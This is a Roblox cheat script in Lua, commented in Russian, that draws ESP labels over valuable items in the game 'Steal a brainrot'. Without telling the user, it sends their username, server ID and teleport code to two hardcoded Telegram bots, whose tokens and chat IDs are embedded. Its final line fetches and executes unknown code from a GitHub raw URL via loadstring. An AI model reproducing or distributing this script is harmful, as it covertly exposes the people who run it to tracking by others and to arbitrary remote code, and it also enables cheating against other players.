local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local request = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request

-- Конфигурация ESP
local ESP_SETTINGS = {
    UpdateInterval = 0.5,
    MaxDistance = 500,
    TextSize = 18,
    Font = Enum.Font.GothamBold,
    PartColors = {
        Color3.new(1, 1, 1),    -- Белый
        Color3.new(0.2, 0.6, 1),-- Синий
        Color3.new(1, 0.2, 0.2) -- Красный
    },
    SoundId = "rbxassetid://130785805",
    SoundVolume = 1.5,
    PlaySoundOnce = false
}

-- Настройки ПЕРВОГО бота (основные уведомления)
local TG_MAIN = {
    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
    ChatId = "1072158346",
    Enabled = true,
    ImportantObjects = {
        ["Secret Lucky Block"] = true,
        ["Pot Hotspot"] = true,
        ["La Grande Combinasion"] = true,
        ["Garama and Madundung"] = true,
        ["Nuclearo Dinossauro"] = true,
        ["Chicleteira Bicicleteira"] = true,
        ["Dragon Cannelloni"] = true,
        ["Los Combinasionas"] = true 
    }
}

-- Настройки ВТОРОГО бота (групповые уведомления)
local TG_SPECIAL = {
    Token = "8403219194:AAHXD_oxTlI2YHWKFz6SKvspfo7hJY32Tsk",
    ChatId = "-1002767532824",
    Enabled = true,
    SpecialObjects = {
        ["La Vacca Saturno Saturnita"] = true,
        ["Chimpanzini Spiderini"] = true
    },
    GroupSettings = {
        PinMessages = true,
        DisableNotifications = false
    }
}

-- Список объектов с эмодзи
local OBJECT_EMOJIS = {
    ["La Vacca Saturno Saturnita"] = "🐮",
    ["Chimpanzini Spiderini"] = "🕷",
    ["Los Tralaleritos"] = "🐟",
    ["Las Tralaleritas"] = "🌸",
    ["Graipuss Medussi"] = "🦑",
    ["Torrtuginni Dragonfrutini"] = "🐉",
    ["Pot Hotspot"] = "📱",
    ["La Grande Combinasion"] = "❗️",
    ["Garama and Madundung"] = "🥫",
    ["Secret Lucky Block"] = "⬛️",
    ["Dragon Cannelloni"] = "🐲",
    ["Nuclearo Dinossauro"] = "🦕",
    ["Las Vaquitas Saturnitas"] = "👦",
    ["Chicleteira Bicicleteira"] = "🚲",
    ["Los Combinasionas"] = "⚒️",
    ["Agarrini la Palini"] = "🥄"
}

-- Список всех объектов
local OBJECT_NAMES = {
    "La Vacca Saturno Saturnita",
    "Chimpanzini Spiderini",
    "Los Tralaleritos",
    "Las Tralaleritas",
    "Graipuss Medussi",
    "Torrtuginni Dragonfrutini",
    "Pot Hotspot",
    "La Grande Combinasion",
    "Garama and Madundung",
    "Secret Lucky Block",
    "Dragon Cannelloni",
    "Nuclearo Dinossauro",
    "Las Vaquitas Saturnitas",
    "Chicleteira Bicicleteira",
    "Los Combinasionas",
    "Agarrini la Palini"
}

-- Системные переменные
local camera = workspace.CurrentCamera
local espCache = {}
local lastUpdate = 0
local foundObjects = {}
local objectsToNotify = {}

-- Создаем интерфейс
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RussianESP"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false

-- Функции утилиты
local function getAccountInfo()
    local player = Players.LocalPlayer
    return player and player.Name or "Неизвестный аккаунт"
end

local function getServerId()
    local jobId = game.JobId
    return jobId ~= "" and jobId or "Одиночная игра"
end

-- Отправка в ОСНОВНОГО бота
local function sendMainTelegramAlert()
    if not TG_MAIN.Enabled or not request or #objectsToNotify == 0 then return end
    
    local serverId = getServerId()
    local username = getAccountInfo()
    
    -- Разделяем объекты на важные и обычные
    local importantObjects = {}
    local regularObjects = {}
    
    for _, objName in ipairs(objectsToNotify) do
        if not TG_SPECIAL.SpecialObjects[objName] then
            if TG_MAIN.ImportantObjects[objName] then
                table.insert(importantObjects, objName)
            else
                table.insert(regularObjects, objName)
            end
        end
    end
    
    if #importantObjects + #regularObjects == 0 then return end
    
    -- Формируем сообщение с выделением важных объектов
    local message = string.format(
        "*🔍 Обнаружены объекты в Steal a brainrot*\n"..
        "👤 Игрок: `@%s`\n"..
        "🌐 Сервер: `%s`\n"..
        "🕘 Время: `%s`\n\n",
        username, serverId, os.date("%X")
    )
    
    -- Добавляем ВАЖНЫЕ объекты с пометкой 🚨
    if #importantObjects > 0 then
        message = message .. "*🚨 ВАЖНЫЕ ОБЪЕКТЫ:*\n"
        for _, objName in ipairs(importantObjects) do
            message = message .. string.format("%s *%s*\n", OBJECT_EMOJIS[objName] or "⚠️", objName)
        end
        message = message .. "\n"
    end
    
    -- Добавляем обычные объекты
    if #regularObjects > 0 then
        message = message .. "*🔹 Обычные объекты:*\n"
        for _, objName in ipairs(regularObjects) do
            message = message .. string.format("%s %s\n", OBJECT_EMOJIS[objName] or "🔸", objName)
        end
    end
    
    -- Код телепортации
    if serverId ~= "Одиночная игра" then
        message = message .. string.format(
            "\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
            serverId
        )
    end
    
    -- Отправка
    request({
        Url = "https://api.telegram.org/bot"..TG_MAIN.Token.."/sendMessage",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_MAIN.ChatId,
            text = message,
            parse_mode = "Markdown"
        })
    })
end

-- Отправка в ГРУППУ (специальные объекты)
local function sendSpecialTelegramAlert(objName)
    if not TG_SPECIAL.Enabled or not request then return end
    
    local serverId = getServerId()
    local username = getAccountInfo()
    local emoji = OBJECT_EMOJIS[objName] or "🔹"
    
    local message = string.format(
        "*🔔 ОБНАРУЖЕН СПЕЦИАЛЬНЫЙ ОБЪЕКТ 🔔*\n"..
        "🕹 Игра: Steal a brainrot\n"..
        "👤 Игрок: `@%s`\n"..
        "🌐 Сервер: `%s`\n"..
        "🕘 Время: `%s`\n\n"..
        "%s *%s*",
        username, serverId, os.date("%X"), emoji, objName
    )
    
    if serverId ~= "Одиночная игра" then
        message = message .. string.format(
            "\n\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
            serverId
        )
    end
    
    local url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/sendMessage"
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            chat_id = TG_SPECIAL.ChatId,
            text = message,
            parse_mode = "Markdown",
            disable_notification = TG_SPECIAL.GroupSettings.DisableNotifications
        })
    })
    
    -- Закрепление сообщения
    if response.Success and TG_SPECIAL.GroupSettings.PinMessages then
        local messageId = HttpService:JSONDecode(response.Body).result.message_id
        request({
            Url = "https://api.telegram.org/bot"..TG_SPECIAL.Token.."/pinChatMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                chat_id = TG_SPECIAL.ChatId,
                message_id = messageId,
                disable_notification = true
            })
        })
    end
end

-- Воспроизведение звука
local function playDetectionSound()
    local sound = Instance.new("Sound")
    sound.SoundId = ESP_SETTINGS.SoundId
    sound.Volume = ESP_SETTINGS.SoundVolume
    sound.Parent = workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 3)
end

-- Создание текста ESP
local function createColoredText(name)
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextSize = ESP_SETTINGS.TextSize
    textLabel.Font = ESP_SETTINGS.Font
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.TextStrokeTransparency = 0.3
    
    local emoji = OBJECT_EMOJIS[name] or "🔹"
    local parts = {}
    for part in name:gmatch("%S+") do
        table.insert(parts, part)
    end
    
    local richText = ""
    for i, part in ipairs(parts) do
        local color = ESP_SETTINGS.PartColors[math.min(i, #ESP_SETTINGS.PartColors)]
        richText = richText .. string.format(
            '<font color="rgb(%d,%d,%d)">%s</font> ',
            math.floor(color.r * 255),
            math.floor(color.g * 255),
            math.floor(color.b * 255),
            i == 1 and emoji.." "..part or part
        )
    end
    
    textLabel.Text = richText
    textLabel.RichText = true
    return textLabel
end

-- Создание ESP элемента
local function createESPElement(obj)
    local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
    if not rootPart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 350, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = ESP_SETTINGS.MaxDistance
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    
    local textLabel = createColoredText(obj.Name)
    textLabel.Parent = billboard
    
    billboard.Adornee = rootPart
    billboard.Parent = screenGui
    
    return {
        labelGui = billboard,
        label = textLabel,
        rootPart = rootPart,
        object = obj
    }
end

-- Основная функция ESP
local function updateESP(deltaTime)
    lastUpdate = lastUpdate + deltaTime
    if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
    lastUpdate = 0

    -- Очистка старых объектов
    for obj, data in pairs(espCache) do
        if not obj.Parent or not data.rootPart.Parent then
            data.labelGui:Destroy()
            espCache[obj] = nil
            foundObjects[obj] = nil
        end
    end

    -- Поиск новых объектов
    for _, obj in ipairs(workspace:GetDescendants()) do
        if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
            local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
            if not rootPart then continue end

            local distance = (rootPart.Position - camera.CFrame.Position).Magnitude
            if distance > ESP_SETTINGS.MaxDistance then
                if espCache[obj] then
                    espCache[obj].labelGui.Enabled = false
                end
                continue
            end

            local isNewObject = not foundObjects[obj]
            foundObjects[obj] = true

            if not espCache[obj] then
                espCache[obj] = createESPElement(obj)
                playDetectionSound()
                
                if isNewObject then
                    table.insert(objectsToNotify, obj.Name)
                    -- Отправка в специального бота
                    if TG_SPECIAL.SpecialObjects[obj.Name] then
                        sendSpecialTelegramAlert(obj.Name)
                    end
                end
            end

            local data = espCache[obj]
            local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
            data.labelGui.Enabled = onScreen
        end
    end
    
    -- Отправка в основного бота
    if #objectsToNotify > 0 then
        sendMainTelegramAlert()
        objectsToNotify = {}
    end
end

-- Запуск системы
RunService.Heartbeat:Connect(updateESP)

-- Обработка игроков
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        updateESP(0)
    end)
end)

-- Первоначальное сканирование
updateESP(0)

print("Steal a brainrot ESP System активирован!")
print("Отслеживается объектов: "..#OBJECT_NAMES)
print("ID сервера:", getServerId())
loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
